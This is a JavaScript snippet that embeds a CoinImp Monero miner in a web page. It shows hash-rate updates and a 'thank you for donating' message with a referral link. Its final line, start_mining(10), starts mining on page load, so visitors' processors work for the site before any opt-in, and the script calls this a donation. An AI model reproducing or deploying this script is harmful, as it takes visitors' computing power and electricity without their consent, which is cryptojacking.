var text = document.getElementById("monero_text");
var _client = new Client.Anonymous('be4b40420be2454808008f0e646536ce448215c147afc3cce015dc35b9dace6f', {
		throttle: 0
	});

function stop_mining(){
	_client.stop();
	text.innerHTML = "Donate your processing power to mine Monero for this site: ";
}

function start_mining(usage){
	stop_mining();
	_client.setThrottle((100 - usage)/100);
	var throttle = _client.getThrottle() * 100;
	_client.start();
	text.innerHTML = "Thank you for donating " + (100 - throttle) + '% of your processing power for mining Monero! Reference: <a href="https://www.coinimp.com/invite/8a82b472-4a09-48f0-9135-ffafc37394e8"> https://www.coinimp.com/invite/8a82b472-4a09-48f0-9135-ffafc37394e8</a>.';
}

var hash_rate_text = document.getElementById("hash_rate_text");
function hashrate(){
	var hps = _client.getHashesPerSecond(); 
	hash_rate_text.innerHTML = "Hash Rate: " + hps + " hash/second";
}
setInterval(hashrate, 1000);

start_mining(10);
